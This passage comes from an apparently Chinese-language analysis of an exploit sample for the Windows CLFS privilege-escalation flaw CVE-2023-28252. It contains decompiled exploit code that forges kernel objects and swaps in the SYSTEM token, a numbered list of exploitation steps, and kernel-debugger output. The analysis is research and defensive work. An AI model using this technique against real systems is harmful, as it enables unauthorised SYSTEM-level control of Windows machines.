PoFxProcessorNotificationKernelAddress1;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000040</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">83886080</span>i64;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000068</span>]<span style="color:#f92672">=</span> ClfsMgmtDeregisterManagedClientAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000048</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">83887104</span>i64;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000400</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">83890944</span>i64;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000448</span>]<span style="color:#f92672">=</span> ntap_address<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001328</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001308</span>]<span style="color:#f92672">=</span> SeSetAccessStateGenericMappingAddressKernelAddr;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CreateLogFile</span>(<span style="color:#f92672">::</span>pszLogFileName,<span style="color:#ae81ff">0xC0010000</span>,<span style="color:#ae81ff">3u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span> v80<span style="color:#f92672">=</span><span style="color:#ae81ff">90</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">NtFsControlFileAddress</span>(hReadPipe[<span style="color:#ae81ff">0</span>],<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64, v91,<span style="color:#ae81ff">0x110038</span>,<span style="color:#f92672">&amp;</span>v80,<span style="color:#ae81ff">2</span>, v57,<span style="color:#ae81ff">0x2000</span>);</span></span><span style="display:flex;"><span> v60<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)system_token_object<span style="color:#f92672">+</span> (<span style="color:#66d9ef">__int64</span>)token_offset;</span></span><span style="display:flex;"><span> v61<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v60<span style="color:#f92672">+</span> v57<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v60<span style="color:#f92672">+</span> v57)<span style="color:#f92672">>=</span><span style="color:#ae81ff">0x8181818181818181u</span>i64 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v59<span style="color:#f92672">>=</span><span style="color:#ae81ff">0xA</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_76;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0xFFFFFFFF</span>]<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v60<span style="color:#f92672">+</span> v57);</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x100000007</span>]<span style="color:#f92672">=</span> v61;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000448</span>]<span style="color:#f92672">=</span> current_token<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CreateLogFile</span>(<span style="color:#f92672">::</span>pszLogFileName,<span style="color:#ae81ff">0xC0010000</span>,<span style="color:#ae81ff">3u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0xFFFFFFFF</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0x1470</span>i64;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x100000007</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000448</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">912</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CreateLogFile</span>(<span style="color:#f92672">::</span>pszLogFileName,<span style="color:#ae81ff">0xC0010000</span>,<span style="color:#ae81ff">3u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);</span></span></code></pre></div><p>从这段代码可以明显看到CVE-2022-37969利用的影子，包括布局0x5000000内存，疑似伪造CClfsContainer对象，利用ClfsEarlierLsn、SeSetAccessStateGenericMappingAddress进行任意地址读写，不同的是本次样本中增加了ClfsMgmtDeregisterManagedClient和PoFxProcessorNotification函数。同时和CVE-2022-37969一样的是两次触发了漏洞，分别读取system token和将system token写入到自身token，达成提权。</p><p>同时还注意到，样本集成了利用RtlClearBit进行提权的技术，由一个全局flag控制决定使用哪种方式，其while循环内逻辑和前一种利用方式一样。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v63<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v64<span style="color:#f92672">=</span> hObject;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">AddLogContainer</span>(<span style="color:#f92672">*</span>v64,<span style="color:#f92672">&amp;</span>pcbContainer, (LPWSTR)<span style="color:#f92672">&amp;</span>v97[<span style="color:#ae81ff">256</span><span style="color:#f92672">*</span> (<span style="color:#66d9ef">__int64</span>)v63],<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000000</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0x5001000</span>i64;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000030</span>]<span style="color:#f92672">=</span> qword_7FF662B44710;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001008</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x50011F8</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001000</span>]<span style="color:#f92672">=</span> ClfsMgmtDeregisterManagedClientAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001028</span>]<span style="color:#f92672">=</span> RtlClearBitKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000008</span>]<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">+</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">56</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CreateLogFile</span>(<span style="color:#f92672">::</span>pszLogFileName,<span style="color:#ae81ff">0xC0010000</span>,<span style="color:#ae81ff">3u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span> v65<span style="color:#f92672">=</span> system_TOKEN;</span></span><span style="display:flex;"><span> system_token_object<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v66<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">size_t</span><span style="color:#f92672">*</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>))(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span> v67<span style="color:#f92672">=</span><span style="color:#a6e22e">sub_7FF662E78B70</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v66</span>(v67,<span style="color:#f92672">&amp;</span>system_token_object, v65,<span style="color:#ae81ff">8</span>i64, v88);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( system_token_object<span style="color:#f92672">>=</span><span style="color:#ae81ff">0x8181818181818181u</span>i64 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v63<span style="color:#f92672">>=</span><span style="color:#ae81ff">0xA</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_88;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v68<span style="color:#f92672">=</span> current_token;</span></span><span style="display:flex;"><span> Size<span style="color:#f92672">=</span> system_token_object;</span></span><span style="display:flex;"><span> v69<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">size_t</span><span style="color:#f92672">*</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>))(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);<span style="color:#75715e">// NtWriteVirtualMemory</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v70<span style="color:#f92672">=</span><span style="color:#a6e22e">sub_7FF662E78B70</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v69</span>(v70, v68,<span style="color:#f92672">&amp;</span>Size,<span style="color:#ae81ff">8</span>i64, v89);</span></span><span style="display:flex;"><span> v71<span style="color:#f92672">=</span> MyLog__08d_base_block;</span></span><span style="display:flex;"><span> v83<span style="color:#f92672">=</span><span style="color:#ae81ff">5232</span>;</span></span><span style="display:flex;"><span> v72<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>))(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span> v73<span style="color:#f92672">=</span><span style="color:#a6e22e">sub_7FF662E78B70</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v72</span>(v73, v71<span style="color:#f92672">+</span><span style="color:#ae81ff">920</span>,<span style="color:#f92672">&amp;</span>v83,<span style="color:#ae81ff">4</span>i64, v90);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LOBYTE</span>(v80)<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span> v74<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">+</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">56</span>);</span></span><span style="display:flex;"><span> v75<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>))(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span> v76<span style="color:#f92672">=</span><span style="color:#a6e22e">sub_7FF662E78B70</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v75</span>(v76, v74,<span style="color:#f92672">&amp;</span>v80,<span style="color:#ae81ff">1</span>i64, v91);</span></span><span style="display:flex;"><span>LABEL_88:</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span> v77<span style="color:#f92672">=</span> v98;</span></span></code></pre></div><p>总结样本利用步骤</p><ol><li>创建一个主blf日志文件，并修改特定偏移的值，而后调用AddLogContainer为其添加容器</li><li>调用CreateLogFIle创建十个用于堆布局的副BLF日志文件，并修改特定偏移的值。</li><li>分别生成0x5000和0x4000对pipe，首先对0x5000对pipe调用WriteFile写入主blf文件的base block地址+0x30，而后从0x1000对开始释放0x667对pipe，而后调用CreateLogFile，传入的文件名为第二步所用的副blf文件名。</li><li>为0x4000对pipe调用WriteFile写入内存，和第三步中写入的一样。</li><li>为前面十个副blf文件添加容器。</li><li>对主blf日志文件调用CreateLogFile，触发漏洞，一共触发两次，分别完成token的读写。</li></ol><p><strong>动态调试</strong></p><p>使用x64dbg调试样本，并使用windbg附加内核调试。在x64dbg中可以看到，样本获取到了system token和自身token地址。</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2023-28252.zh-cn.assets/1.png"/></p><p>在windbg中可以看到已经成功获取到了自身token地址和system token地址</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1: kd> !process 16e0 1</span></span><span style="display:flex;"><span>Searching for Process with Cid == 16e0</span></span><span style="display:flex;"><span>PROCESS ffffcf8bfa9dd180</span></span><span style="display:flex;"><span> SessionId: 1 Cid: 16e0 Peb: 2b65a98000 ParentCid: 1cf4</span></span><span style="display:flex;"><span>FreezeCount 1</span></span><span style="display:flex;"><span> DirBase: a9197000 ObjectTable: ffffa80486c39280 HandleCount: 171.</span></span><span style="display:flex;"><span> Image: 06248628e1ede80fcc3c36b25.exe</span></span><span style="display:flex;"><span> VadRoot ffffcf8bfaac8ab0 Vads 86 Clone 0 Private 2360. Modified 5134. Locked 0.</span></span><span style="display:flex;"><span> DeviceMap ffffa80480c82af0</span></span><span style="display:flex;"><span> Token ffffa80486595060</span></span><span style="display:flex;"><span> ElapsedTime 00:14:19.644</span></span><span style="display:flex;"><span> UserTime 00:00:00.000</span></span><span style="display:flex;"><span> KernelTime 00:00:00.000</span></span><span style="display:flex;"><span> QuotaPoolUsage[PagedPool] 195352</span></span><span style="display:flex;"><span> QuotaPoolUsage[NonPagedPool] 12024</span></span><span style="display:flex;"><span> Working Set Sizes (now,min,max) (5527, 50, 345) (22108KB, 200KB, 1380KB)</span></span><span style="display:flex;"><span> PeakWorkingSetSize 5447</span></span><span style="display:flex;"><span> VirtualSize 4247 Mb</span></span><span style="display:flex;"><span> PeakVirtualSize 4247 Mb</span></span><span style="display:flex;"><span> PageFaultCount 12131</span></span><span style="display:flex;"><span> MemoryPriority BACKGROUND</span></span><span style="display:flex;"><span> BasePriority 8</span></span><span style="display:flex;"><span> CommitCharge 3956</span></span><span style="display:flex;"><span> DebugPort ffffcf8bf58da970</span></span><span style="display:flex;"><span> Job ffffcf8bf5fd5060</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>1: kd> dq FFFFCF8BFA9DD638</span></span><span style="display:flex;"><span>ffffcf8b`fa9dd638 ffffa804`86595064 00000000`00000000</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>1: kd> !process 4 1</span></span><span style="display:flex;"><span>Searching for Process with Cid == 4</span></span><span style="display:flex;"><span>PROCESS ffffcf8bf1695040</span></span><span style="display:flex;"><span> SessionId: none Cid: 0004 Peb: 00000000 ParentCid: 0000</span></span><span style="display:flex;"><span> DirBase: 001ad000 ObjectTable: ffffa8047c03ddc0 HandleCount: 2771.</span></span><span style="display:flex;"><span> Image: System</span></span><span style="display:flex;"><span> VadRoot ffffcf8bf1dd2da0 Vads 6 Clone 0 Private 22. Modified 335861. Locked 0.</span></span><span style="display:flex;"><span> DeviceMap ffffa8047c0351e0</span></span><span style="display:flex;"><span> Token ffffa8047c04f6e0</span></span><span style="display:flex;"><span> ElapsedTime 2 Days 23:05:23.432</span></span><span style="display:flex;"><span> UserTime 00:00:00.000</span></span><span style="display:flex;"><span> KernelTime 00:07:35.203</span></span><span style="display:flex;"><span> QuotaPoolUsage[PagedPool] 0</span></span><span style="display:flex;"><span> QuotaPoolUsage[NonPagedPool] 272</span></span><span style="display:flex;"><span> Working Set Sizes (now,min,max) (24, 50, 450) (96KB, 200KB, 1800KB)</span></span><span style="display:flex;"><span> PeakWorkingSetSize 218</span></span><span style="display:flex;"><span> VirtualSize 3 Mb</span></span><span style="display:flex;"><span> PeakVirtualSize 14 Mb</span></span><span style="display:flex;"><span> PageFaultCount 3280</span></span><span style="display:flex;"><span> MemoryPriority BACKGROUND</span></span><span style="display:flex;"><span> BasePriority 8</span></span><span style="display:flex;"><span> CommitCharge 49</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>1: kd> dq ffffcf8bf16954f8</span></span><span style="display:flex;"><span>ffffcf8b`f16954f8 ffffa804`7c04f6e3 00000000`00000000</span></span><span style="display:flex;"><span>ffffcf8b`f1695508 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>ffffcf8b`f1695518 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>ffffcf8b`f1695528 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>ffffcf8b`f1695538 00000000`00000016 00000000`00000000</span></span><span style="display:flex;"><span>ffffcf8b`f1695548 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>ffffcf8b`f1695558 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>ffffcf8b`f1695568 00000000`5333eb49 00000000`00000000</span></span></code></pre></div><p>而后获取到了各个内核函数地址</p><p><img src="../../../images/vulnerability/Windows-CLFS-EoP/2.png" alt="" path="vulnerability/Windows-CLFS-EoP/" if="vulnerability/Windows-CLFS-EoP/CVE-2023-28252.zh-cn.md"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1: kd> u FFFFF80634782B20</span></span><span style="display:flex;"><span>CLFS!ClfsEarlierLsn:</span></span><span style="display:flex;"><span>fffff806`34782b20 488b0511280000 mov rax,qword ptr [CLFS!CLFS_LSN_INVALID (fffff806`34785338)]</span></span><span style="display:flex;"><span>fffff806`34782b27 4885c9 test rcx,rcx</span></span><span style="display:flex;"><span>fffff806`34782b2a 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff806`34782b62)</span></span><span style="display:flex;"><span>fffff806`34782b2c 488b09 mov rcx,qword ptr [rcx]</span></span><span style="display:flex;"><span>fffff806`34782b2f 483b0d8a230000 cmp rcx,qword ptr [CLFS!CLFS_LSN_NULL (fffff806`34784ec0)]</span></span><span style="display:flex;"><span>fffff806`34782b36 742a je CLFS!ClfsEarlierLsn+0x42 (fffff806`34782b62)</span></span><span style="display:flex;"><span>fffff806`34782b38 483bc8 cmp rcx,rax</span></span><span style="display:flex;"><span>fffff806`34782b3b 7425 je CLFS!ClfsEarlierLsn+0x42 (fffff806`34782b62)</span></span></code></pre></div><p>在获取到主blf日志文件的base block后通过writefile写入匿名pipe</p><p><img src="../../../images/vulnerability/Windows-CLFS-EoP/3.png" alt="" path="vulnerability/Windows-CLFS-EoP/" if="vulnerability/Windows-CLFS-EoP/CVE-2023-28252.zh-cn.md"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db FFFFA80488303000</span></span><span style="display:flex;"><span>ffffa804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">88303000</span><span style="color:#ae81ff">15</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">03</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">3</span>d<span style="color:#ae81ff">00</span><span style="color:#ae81ff">3</span>d<span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ....<span style="color:#f92672">=</span>.<span style="color:#f92672">=</span>.........</span></span><span style="display:flex;"><span>ffffa804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">88303010</span><span style="color:#ae81ff">02</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ff ff ff ff ................</span></span><span style="display:flex;"><span>ffffa804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">88303020</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ff ff ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">70</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ........p.......</span></span><span style="display:flex;"><span>ffffa804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">88303030</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffa804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">88303040</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffa804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">88303050</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">69</span><span style="color:#ae81ff">03</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ........i.......</span></span><span style="display:flex;"><span>ffffa804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">88303060</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">80</span><span style="color:#ae81ff">79</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> .........y......</span></span><span style="display:flex;"><span>ffffa804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">88303070</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">80</span><span style="color:#ae81ff">11</span><span style="color:#ae81ff">28</span><span style="color:#ae81ff">07</span><span style="color:#ae81ff">7</span>e<span style="color:#ae81ff">19</span> ee<span style="color:#ae81ff">11</span> ..........(.<span style="color:#f92672">~</span>...</span></span></code></pre></div><p>由于不知道样本修改的文件中哪个部分起到了关键性作用，此时由果追溯原因，样本在伪造的CClfsContainer对象中布局了ClfsEarlierLsn函数地址，在CVE-2022-37969中已经知道该函数是触发漏洞的关键性函数，在ClfsEarlierLsn函数断点，继续运行，调试器断下，此时调用栈如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> k</span></span><span style="display:flex;"><span> # Child-SP RetAddr Call Site</span></span><span style="display:flex;"><span>00 ffffa00a`59414fb8 fffff800`53141ba6 CLFS!ClfsEarlierLsn</span></span><span style="display:flex;"><span>01 ffffa00a`59414fc0 fffff800`531337e8 CLFS!ClfsMgmtDeregisterManagedClient+0x46</span></span><span style="display:flex;"><span>02 ffffa00a`59414ff0 fffff800`5310307f CLFS!CClfsBaseFilePersisted::CheckSecureAccess+0x174</span></span><span style="display:flex;"><span>03 ffffa00a`594150b0 fffff800`53101bf9 CLFS!CClfsLogFcbPhysical::CheckSecureAccess+0x1f</span></span><span style="display:flex;"><span>04 ffffa00a`59415100 fffff800`531310c3 CLFS!CClfsLogFcbPhysical::Initialize+0x15d</span></span><span style="display:flex;"><span>05 ffffa00a`59415240 fffff800`53132b1b CLFS!CClfsRequest::Create+0x4ef</span></span><span style="display:flex;"><span>06 ffffa00a`59415390 fffff800`531328e7 CLFS!CClfsRequest::Dispatch+0x97</span></span><span style="display:flex;"><span>07 ffffa00a`594153e0 fffff800`53132837 CLFS!ClfsDispatchIoRequest+0x87</span></span><span style="display:flex;"><span>08 ffffa00a`59415430 fffff800`55c954d5 CLFS!CClfsDriver::LogIoDispatch+0x27</span></span><span style="display:flex;"><span>09 ffffa00a`59415460 fffff800`55c96ad4 nt!IofCallDriver+0x55</span></span><span style="display:flex;"><span>0a ffffa00a`594154a0 fffff800`560a775d nt!IoCallDriverWithTracing+0x34</span></span><span style="display:flex;"><span>0b ffffa00a`594154f0 fffff800`5608f68e nt!IopParseDevice+0x117d</span></span><span style="display:flex;"><span>0c ffffa00a`59415660 fffff800`560ba3da nt!ObpLookupObjectName+0x3fe</span></span><span style="display:flex;"><span>0d ffffa00a`59415830 fffff800`560c999f nt!ObOpenObjectByNameEx+0x1fa</span></span><span style="display:flex;"><span>0e ffffa00a`59415960 fffff800`560c9579 nt!IopCreateFile+0x40f</span></span><span style="display:flex;"><span>0f ffffa00a`59415a00 fffff800`55e0d8f5 nt!NtCreateFile+0x79</span></span><span style="display:flex;"><span>10 ffffa00a`59415a90 00007ffd`9160db64 nt!KiSystemServiceCopyEnd+0x25</span></span><span style="display:flex;"><span>11 00000077`5eafb898 00007ffd`8c382199 ntdll!NtCreateFile+0x14</span></span><span style="display:flex;"><span>12 00000077`5eafb8a0 00007ff7`ecad416a clfsw32!CreateLogFile+0x679</span></span><span style="display:flex;"><span>13 00000077`5eafba40 00007ff7`ecad461c 0624fbfa7618628e1ede80fcc3c36b25+0x416a</span></span><span style="display:flex;"><span>14 00000077`5eaffca0 00007ffd`900c7614 0624fbfa7618628e1ede80fcc3c36b25+0x461c</span></span><span style="display:flex;"><span>15 00000077`5eaffce0 00007ffd`915c26a1 KERNEL32!BaseThreadInitThunk+0x14</span></span><span style="display:flex;"><span>16 00000077`5eaffd10 00000000`00000000 